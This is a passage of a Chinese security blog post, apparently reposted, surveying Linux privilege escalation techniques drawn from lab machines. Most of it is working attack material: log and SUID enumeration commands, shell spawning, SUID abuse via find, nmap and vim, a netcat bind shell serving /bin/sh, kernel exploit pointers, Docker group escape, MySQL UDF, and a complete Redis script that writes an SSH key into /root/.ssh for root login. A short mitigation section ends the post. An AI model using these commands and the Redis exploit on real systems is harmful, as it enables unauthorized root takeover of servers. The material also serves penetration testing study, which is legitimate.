/var/log/boot.logcat /var/log/croncat /var/log/syslogcat /var/log/wtmpcat /var/run/utmpcat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;echo os.system(&#39;/bin/bash&#39;)/bin/sh -i</code></pre><h3 id="可提权SUID-amp-amp-GUID"><a href="#可提权SUID-amp-amp-GUID" class="headerlink" title="可提权SUID &amp;&amp; GUID"></a>可提权SUID &amp;&amp; GUID</h3><blockquote><p>参考资料<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p></blockquote><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</code></pre><h3 id="查看可写-执行目录"><a href="#查看可写-执行目录" class="headerlink" title="查看可写/执行目录"></a>查看可写/执行目录</h3><pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o w -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o x -type d 2&gt;/dev/null     # world-executable foldersfind / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h3 id="查看安装过的工具"><a href="#查看安装过的工具" class="headerlink" title="查看安装过的工具"></a>查看安装过的工具</h3><pre><code>find / -name perl*find / -name python*find / -name gcc*...</code></pre><h1 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h1><h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><blockquote><p>什么是suid？suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p></blockquote><p>这里推荐 P师傅的 <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>常见的可用来提权的Linux 可执行文件有：</p><p>Nmap, Vim, find, bash, more, less, nano, cp</p><p>查看可以suid 提权的可执行文件</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311170215513.png" alt="image-20220311170215513"></p><ul><li>find</li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-793add5c-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-793add5c-ba7a-1.png" alt="img"></a></p><pre><code>ls -al /usr/bin/find-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><blockquote><p>实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p></blockquote><p>比如：DC -1 靶机就是利用find 命令进行root 用户来执行命令</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-796d1704-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-796d1704-ba7a-1.png" alt="img"></a></p><p>大部分Linux 系统都安装了nc。使用<code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code>  即可成功反弹root shell</p><ul><li>nmap</li></ul><p>早期nmap 具有交互模式，version 2.02～5.21（5.2.0）。这里我用metasploitable2 来演示</p><p><code>namp -V</code> 查看nmap 版本信息</p><pre><code>nmap --interactive</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164705-9e3b1b62-b2d2-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164705-9e3b1b62-b2d2-1.png" alt="img"></a></p><p>我最喜欢的<code>Metasploit</code> 中就有利用 SUID nmap 提权的exp</p><p><code>search nmap</code> 然后利用 <code>exploit/unix/local/setuid_nmap</code> 漏洞利用模块即可</p><p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p><pre><code># nse 脚本，shell.nseos.execute(&#39;/bin/sh&#39;)# nmap 提权nmap --script=shell.nse # 在某些发行版的Linux 可能会提权失败。具体原理移步p 师傅文章</code></pre><p>或者</p><pre><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; getshellsudo nmap --script=getshell</code></pre><p>参考DC 6 靶机：<a href="https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83">https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83</a></p><ul><li>vim</li></ul><p>如果vim 是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。</p><pre><code>vim /etc/shadow</code></pre><p>vim 运行shell</p><pre><code>vim:set shell=/bin/sh:shell</code></pre><p>同理，满足条件的 less 和 more 都可。</p><h3 id="利用内核漏洞"><a href="#利用内核漏洞" class="headerlink" title="利用内核漏洞"></a>利用内核漏洞</h3><p>比如DC 3 靶机，就是利用系统内核漏洞来进行提权。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-79a162ac-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-79a162ac-ba7a-1.png" alt="img"></a></p><pre><code>searchsploit Ubuntu 16.04</code></pre><p>将exp 下载下来，解压，编译，运行，即可get root 权限。</p><pre><code>tar xvf exploit.tar</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-79fd0a12-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-79fd0a12-ba7a-1.png" alt="img"></a></p><p><a href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a></p><p>还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel &gt;=2.6.22 并且Android也受影响</p><ul><li><a href="https://github.com/timwr/CVE-2016-5195">https://github.com/timwr/CVE-2016-5195</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li><li>复现参考：<a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></li></ul><p>其他内核漏洞：</p><p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – ‘overlayfs’ Local Root Shell</p><p><a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit</p><p><a href="https://www.exploit-db.com/exploits/39166/">https://www.exploit-db.com/exploits/39166/</a></p><p>Linux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation</p><p><a href="https://www.exploit-db.com/exploits/39230/">https://www.exploit-db.com/exploits/39230/</a></p><blockquote><p>提示：内核exploit提权有风险，有可能会崩溃系统。</p></blockquote><h3 id="利用root无密码执行"><a href="#利用root无密码执行" class="headerlink" title="利用root无密码执行"></a>利用root无密码执行</h3><p>简单来说，就是一个脚本，比如py,sh等或者是一个命令。这个文件可以以root身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。</p><p>比如常见的：</p><ul><li>写入一个root身份权限的用户进入/etc/passwd 文件中</li></ul><p>这里以DC 4 为例子：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a2357bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a2357bc-ba7a-1.png" alt="img"></a></p><p><code>teehee -a</code> 将输入的内容追加到另一个文件中</p><p>简单说下<code>/etc/passwd</code> 各个字段的含义：</p><pre><code>username:password:User ID:Group ID:comment:home directory:shell</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a3b91c4-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a3b91c4-ba7a-1.png" alt="img"></a></p><p>成功获取到root 权限。类似的操作还有很多，核心思想不变。</p><h3 id="利用环境变量提权"><a href="#利用环境变量提权" class="headerlink" title="利用环境变量提权"></a>利用环境变量提权</h3><p><code>PATH</code> 是Linux 和 Unix  操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。</p><p>使用echo命令显示当前PATH环境变量：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164053-c0c00b12-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164053-c0c00b12-b2d1-1.png" alt="img"></a></p><p>如果你在PATH变量中看到<code>.</code>，则意味着登录用户可以从当前目录执行二进制文件/脚本</p><p>我们先编译一个可执行文件shell。</p><pre><code>#include&lt;unistd.h&gt;void main()&#123;  setuid(0);  setgid(0);  system(&quot;cat /etc/passwd&quot;);&#125;// aaa.c</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164152-e392c15c-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164152-e392c15c-b2d1-1.png" alt="img"></a></p><p>在给该文件赋予权限。</p><p>然后查看它的权限可以发现是有<code>s</code> 位，即suid。</p><p>现在我们在目标机器上用<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png" alt="img"></a></p><p>更多的操作可以参考：<a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p><h3 id="利用存在漏洞的命令"><a href="#利用存在漏洞的命令" class="headerlink" title="利用存在漏洞的命令"></a>利用存在漏洞的命令</h3><p>不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用<code>searchsploit</code> 来寻找可利用的exp。</p><p>这里以DC 5 靶机为例：</p><p><code>ls -al</code> ：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7a819cc8-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7a819cc8-ba7a-1.png" alt="img"></a></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7acd7cec-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7acd7cec-ba7a-1.png" alt="img"></a></p><p>可以通过cat 读取一下这个文件怎么用。</p><p>攻击机器开启一个http 服务：</p><pre><code>python -m SimpleHTTPServer</code></pre><p>将exploit 用 wget 下载到可执行的<code>/tmp/</code>目录下。然后执行<code>sh</code> 文件。最后在<code>/etc/</code>目录下执行<code>./rootshell</code> 即可get root shell。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7afc19bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103620-7afc19bc-ba7a-1.png" alt="img"></a></p><hr><p>还有之前爆的sudo 提权，CVE-2019-14187。只不过比较鸡肋。</p><blockquote><p><strong>Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。</strong></p></blockquote><p><strong>利用前提</strong></p><ol><li>sudo -v &lt; 1.8.28</li><li>知道当前用户的密码</li><li>当前用户存在于sudo权限列表</li></ol><p>复现参考：<a href="https://www.cnblogs.com/ethtool/p/12176730.html">https://www.cnblogs.com/ethtool/p/12176730.html</a></p><h3 id="利用第三方服务提权"><a href="#利用第三方服务提权" class="headerlink" title="利用第三方服务提权"></a>利用第三方服务提权</h3><h4 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h4><p>参考文章：<a href="https://blog.csdn.net/qq_41918771/article/details/103666135">https://blog.csdn.net/qq_41918771/article/details/103666135</a></p><blockquote><p>docker 组内用户执行命令的时候会自动在所有命令前添加 sudo。因为设计或者其他的原因，Docker  给予所有 docker 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）。默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker<br> 组用户访问 Docker。给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。</p></blockquote><p>普通用户执行：即可获得root权限。</p><pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png" alt="img"></a></p><h4 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL UDF 提权"></a>MySQL UDF 提权</h4><p>之前在做JarivsOJ CTF 里有一个题，里面就用了UDF，那是我第一次遇到这个东西。</p><pre><code>show variables like &#39;%compile%&#39;;show variables like &#39;plugin%&#39;;</code></pre><p>不过这里有一个限制，<code>show global variables like &#39;secure%&#39;</code> secure_file_priv 没有具体的值（即能够导出/写入文件</p><blockquote><p>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br> 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权<br> 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p></blockquote><p>MSF 中的 <code>exploit/multi/mysql/mysql_udf_payload</code> 漏洞利用模块可以进行UDF提权</p><p>使用 <code>select sys_exec(&#39;whoami&#39;);</code> 或 <code>select sys_eval(&#39;whoami&#39;);</code> 来执行系统命令</p><h4 id="Redis-批量getshell"><a href="#Redis-批量getshell" class="headerlink" title="Redis 批量getshell"></a>Redis 批量getshell</h4><blockquote><p>如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p></blockquote><p>相关利用exp：<a href="https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py">https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py</a></p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# project = https://github.com/Xyntax/POC-T# author = i@cdxy.me&quot;&quot;&quot;redis getshell expliot (ssh authorized_keys)&quot;&quot;&quot;import redisimport paramikofrom plugin.util import host2IPfrom plugin.util import randomStringfrom plugin.util import checkPortTcpfrom paramiko.ssh_exception import SSHExceptionpublic_key = &#39;ssh-rsa =====&#39;private_key = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----=====-----END RSA PRIVATE KEY-----&quot;&quot;&quot;import timedef poc(url):    url = host2IP(url)    ip = url.split(&#39;:&#39;)[0]    port = int(url.split(&#39;:&#39;)[-1]) if &#39;:&#39; in url else 6379    try:        if not checkPortTcp(ip, 22):            return False        r = redis.Redis(host=ip, port=port, db=0)        if &#39;redis_version&#39; in r.info():            key = randomString(10)            r.set(key, &#39;\n\n&#39; + public_key + &#39;\n\n&#39;)            r.config_set(&#39;dir&#39;, &#39;/root/.ssh&#39;)            r.config_set(&#39;dbfilename&#39;, &#39;authorized_keys&#39;)            r.save()            r.delete(key)  # 清除痕迹            r.config_set(&#39;dir&#39;, &#39;/tmp&#39;)            time.sleep(5)            if testConnect(ip, 22):                return True    except Exception:        return False    return Falsedef testConnect(ip, port=22):    try:        s = paramiko.SSHClient()        s.load_system_host_keys()        s.connect(ip, port, username=&#39;root&#39;, pkey=private_key, timeout=10)        s.close()        return True    except Exception, e:        if type(e) == SSHException:            return True        return False</code></pre><p>其他……</p><blockquote><p>一般情况情况下，内核漏洞或者第三方服务来提权的情况更多。</p></blockquote><h1 id="如何防止被提权"><a href="#如何防止被提权" class="headerlink" title="如何防止被提权"></a>如何防止被提权</h1><ul><li>系统管理员要安全，准确的配置SUID执行文件。</li><li>一些没必要以高权限用户执行的文件，应该取消权限。</li><li>规避使用无密码root 执行命令，脚本等。</li><li>修复/升级存在已知漏洞的组件，升级操作系统版本最新版。</li><li>Linux 2.2 之后可以为命令增加 capabilities, 以p 师傅博客里的给nmap增加该属性为例。</li><li>升级第三方服务，修复已知漏洞</li></ul><pre><code>sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmapnmap --privileged -sS 192.168.1.1</code></pre><p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次学习，脑海里有了一个大概的思路，以后遇到了也不会迷惘。但是我旁边师傅给我说，靶机的提权有些在实际中根本用不到。所以，还是要灵活处理，核心思路应该是不变的吧！</p><p>注:本篇文章转自先知社区 ： <a href="https://xz.aliyun.com/t/7924#toc-0">https://xz.aliyun.com/t/7924#toc-0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;为什么要提权&quot;&gt;&lt;a href=&quot;#为什么要提权&quot; class=&quot;headerlink&quot; title=&quot;为什么要提权?&quot;&gt;&lt;/a&gt;为什么要提权?&lt;/h1&gt;&lt;p&gt;当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux提权" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
